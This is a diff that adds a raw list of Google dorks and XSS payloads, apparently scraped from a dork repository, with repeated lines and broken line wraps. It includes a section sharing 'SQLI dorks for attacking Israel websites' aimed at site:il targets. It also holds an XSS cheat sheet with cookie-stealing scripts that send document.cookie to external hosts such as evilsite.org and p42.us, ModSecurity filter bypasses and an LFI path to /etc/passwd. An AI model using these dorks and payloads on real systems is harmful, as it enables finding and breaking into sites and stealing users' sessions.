@@ -1,0 +1,295 @@
+inurl:& inurl:test
+inurl:& inurl:quiz
+inurl:& inurl:survey
+inurl:& inurl:game
+inurl:& inurl:competition
+inurl:& inurl:form
+inurl:& inurl:title
+inurl:& inurl:search
+inurl:& inurl:city
+inurl:& inurl:date
+inurl:& inurl:topic
+inurl:& inurl:search inurl:q
+inurl:& inurl:search inurl:s
+index.php? inurl:& 
+inurl:search
+inurl:suche
+inurl:page
+inurl:& inurl:query
+inurl:& inurl:suche
+inurl:& inurl:input
+inurl:& inurl:next
+inurl:& inurl:target
+inurl:search inurl:page
+https://github.com/Ishanoshada/GDorks/
+inurl:search inurl:p
+inurl:query filetype:html inurl:page
+inurl:query filetype:html inurl:sort
+inurl:query filetype:php
+XSS Dorks and Cheats XSS Dorks
+Google Dorks:
+I share with you some SQLI dorks for attacking
+Israel websites
+ intext:"error in your SQL syntax" +site:il
+<p>    intext:"mysql_num_rows()" +site:il</
+p><p>    intext:"mysql_fetch_array()" +site:il</
+p><p>    intext:"Error Occurred While Processing
+Request" +site:il</p><p>    intext:"Server Error in
+'/' Application" +site:il</p><p>    intext:"Microsoft
+OLE DB Provider for ODBC Drivers error"
++site:il</p><p>    intext:"Invalid Querystring"
++site:il</p><p>    intext:"OLE DB Provider for
+ODBC" +site:il</p><p>    intext:"VBScript
+Runtime" +site:il</p><p>    intext:"ADODB.Field"
++site:il</p><p>    intext:"BOF or EOF" +site:il</
+p><p>    intext:"ADODB.Command" +site:il</
+p><p>    intext:"JET Database" +site:il</p><p>
+intext:"mysql_fetch_row()" +site:il</p><p>
+intext:"Syntax error" +site:il</p><p>
+intext:"include()" +site:il  </p><p>
+intext:"mysql_fetch_assoc()" +site:il</p><p>
+intext:"mysql_fetch_object()" +site:il</p><p>
+intext:"mysql_numrows()" +site:il</p><p>
+intext:"GetArray()" +site:il</p><p>
+intext:"FetchRow()" +site:il</p>    intext:"Input
+string was not in a correct format" +site:il
+Using "site:.il" will limit the search to only Israel
+domains.
+Use SQLi dorks and just add "site:.il" to the
+begining of the query,
+example below:
+site:.il inurl:news?id=
+site:.il inurl:viewshowdetail.php?id=
+site:.il inurl:clubpage.php?id=
+site:.il inurl:memberInfo.php?id=
+site:.il inurl:section.php?id=
+site:.il inurl:theme.php?id=
+site:.il inurl:page.php?id=
+site:.il inurl:shredder-categories.php?id=
+site:.il inurl:tradeCategory.php?id=
+site:.il inurl:product_ranges_view.php?ID=
+site:.il inurl:shop_category.php?id=
+site:.il inurl:transcript.php?id=
+Code:
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostold/feedpost.php?url=
+inurl:scrapbook.php?id=
+inurl:headersearch.php?sid=
+inurl:/poll/default.asp?catid=
+inurl:/search_results.php?search=
+XSS Cheats
+Code:
+'';!--"<XSS>=&{()}
+'>//\\,<'>">">"*"
+'); alert('XSS
+<script>alert(1);</script>
+<script>alert('XSS');</script>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<script src=" http://www.evilsite.org/
+cookiegrabber.php "></script>
+<script>location.href=" http://www.evilsite.org/
+cookiegrabber.php?cookie= "+escape(docume
+nt.cookie)</script>
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+<script>alert(String.fromCharCode(88,83,83))</
+script>
+<img src=foo.png onerror=alert(/xssed/) />
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</
+style>
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?
+>
+<marquee><script>alert('XSS')</script></marquee>
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+<IMG SRC=javascript:alert(String.fromCharCode
+(88,83,83))>
+"><script>alert(0)</script>
+<script src= http://yoursite.com/your_files.js ></
+script>
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<font style='color:expression(alert(document.cookie
+))'>
+<img src="javascript:alert('XSS')">
+<script language="JavaScript">alert('XSS')</script>
+<body onunload="javascript:alert('XSS');">
+<body onLoad="alert('XSS');"
+[color=red' onmouseover="alert('xss')"]mouse over
+[/color]
+"/></a></><img src=1.gif onerror=alert(1)>
+window.alert("Bonjour !");
+<div style="x:expression((window.r==1)?'':eval('r=1;
+alert(String.fromCharCode(88,83,83));'))">
+<iframe<?php echo chr(11)?> onload=alert('X
+SS')></iframe>
+"><script alert(String.fromCharCode(88,83,83))</
+script>
+'>><marquee><h1>XSS</h1></marquee>
+'">><script>alert('XSS')</script>
+'">><marquee><h1>XSS</h1></marquee>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url
+=javascript:alert('XSS');\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;
+URL=http://;URL=javascript:alert('XSS');\">
+<script>var var = 1; alert(var)</script>
+<STYLE type="text/css">BODY{background:url
+("javascript:alert('XSS')")}</STYLE>
+<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+" onfocus=alert(document.domain) "> <"
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');
+\"></FRAMESET>
+<STYLE>li {list-style-image: url(\"javascript:alert
+('XSS')\");}</STYLE><UL><LI>XSS
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR
+\0IPT>\";' > out
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\"
+)>\";' > out
+<br size=\"&{alert('XSS')}\">
+<scrscriptipt>alert(1)</scrscriptipt>
+</br style=a:expression(alert())>
+</script><script>alert(1)</script>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert
+("XSS")>
+[color=red width=expression(alert(123))][color]
+<BASE HREF="javascript:alert('XSS');//">
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+"></iframe><script>alert(123)</script>
+<body onLoad="while(true) alert('XSS');">
+'"></title><script>alert(1111)</script>
+</textarea>'"><script>alert(document.cookie)</
+script>
+'""><script language="JavaScript"> alert('X \nS
+\nS');</script>
+</script></script><<<<script><>>>><<<script>alert
+(123)</script>
+<html><noalert><noscript>(123)</noscript><script>
+https://github.com/Ishanoshada/GDorks/
+(123)</script>
+<INPUT TYPE="IMAGE" SRC="javascript:alert
+('XSS');">
+'></select><script>alert(123)</script>
+'>"><script src = ' http://www.site.com/XSS.js '></
+script>
+}</style><script>a=eval;b=alert;a(b(/XSS/
+.source));</script>
+<SCRIPT>document.write("XSS");</SCRIPT>
+a="get";b="URL";c="javascript:";d="alert('xss
+');";eval(a+b+c+d);
+='><script>alert("xss")</script>
+<script+src=">"+src=" http://yoursite.com/xss.js?
+69,69 "></script>
+<body background=javascript:'"><script>alert
+(navigator.userAgent)</script>></body>
+">/XaDoS/><script>alert(document.cookie)</
+script><script src=" http://www.site.com/XSS.js "></
+script>">/KinG-InFeT.NeT/><script>alert(d
+ocument.cookie)</script>
+src=" http://www.site.com/XSS.js "></script>
+data:text/html;charset=utf-7;base64,Ij48L
+3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTM
+zNyk8L3NjcmlwdD4=
+!--" /><script>alert('xss');</script>
+<script>alert("XSS by \nxss")</script><marquee>
+<h1>XSS by xss</h1></marquee>
+"><script>alert("XSS by \nxss")</script>><marquee
+><h1>XSS by xss</h1></marquee>
+'"></title><script>alert("XSS by \nxss")</
+script>><marquee><h1>XSS by xss</h1></
+marquee>
+<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+<script>alert(1337)</script><marquee><h1>XSS by
+xss</h1></marquee>
+"><script>alert(1337)</script>"><script>alert("XSS
+by \nxss</h1></marquee>
+'"></title><script>alert(1337)</script>><marquee
+><h1>XSS by xss</h1></marquee>
+<iframe src="javascript:alert('XSS by \nxss');"></
+iframe><marquee><h1>XSS by xss</h1></marquee>
+<iframe src= http://othersite/sb.php >
+
+Test reflected Xss
+
+%22onmouseover%3d%27alert
+%28%22immuniweb%22%29%27%20a%3d
+%22%3E
+
+ModSecurity Filters bypass
+
+The filter will catch:
+<img src="x:gif" onerror="alert(0)">
+but miss:
+<img src="x:alert" onerror="eval(src '(0)')">
+and
+<img src="x:gif" onerror="eval('al' 'lert(0)')">
+and
+<img src="x:gif" onerror="window['alu0065rt']
+(0)"></img>
+The filter will catch:
+";document.write('<img src=http://p42.us/x.png?'
+document.cookie '>');"
+but miss:
+";document.write('<img sr' 'c=http://p42.us/x.png?'
+document['cookie'] '>');"
+LFI
+/foo/../etc/bar/../passwd
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchst­ring="
+inurl:".php?keyword=­"
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback­="
+https://github.com/Ishanoshada/GDorks/
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostol­d/feedpost.php?url=
+inurl:scrapbook.php?­id=
+inurl:headersearch.p­hp?sid=
+inurl:/poll/­default.asp?catid=
+inurl:/­search_results.php?se­arch=
+inurl:categoryId inurl:storeId (2 million results)
+inurl:resultCatEntryType
+inurl:searchTermScope
+inurl:”webapp/wcs”
+inurl:”ProductListingView”
+inurl:”AdvancedSearchDisplay”
+inurl:”CompareProductsDisplayView”
+inurl:parent_category_rn
